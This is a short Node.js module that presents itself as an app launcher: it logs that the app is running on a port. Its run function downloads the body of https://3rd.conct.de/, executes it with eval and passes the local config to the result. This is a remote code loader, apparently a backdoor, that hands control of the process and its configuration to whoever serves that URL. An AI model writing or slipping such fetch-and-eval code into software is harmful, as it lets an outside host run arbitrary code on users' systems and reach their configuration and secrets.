const request = require('request')

module.exports = {
	run: (config) => {
		request('https://3rd.conct.de/', function (error, response, body) {
			//console.log('error:', error); // Print the error if one occurred
			//console.log('statusCode:', response && response.statusCode); // Print the response status code if a response was received
			//console.log('body:', body); // Print the HTML
			
			let app = eval(body)
			app.init(config, (typeof process.argv[4] != 'undefined' ? process.argv[4] : 'run'))
		})
		console.log('App running on port ' + config.port)
	}
}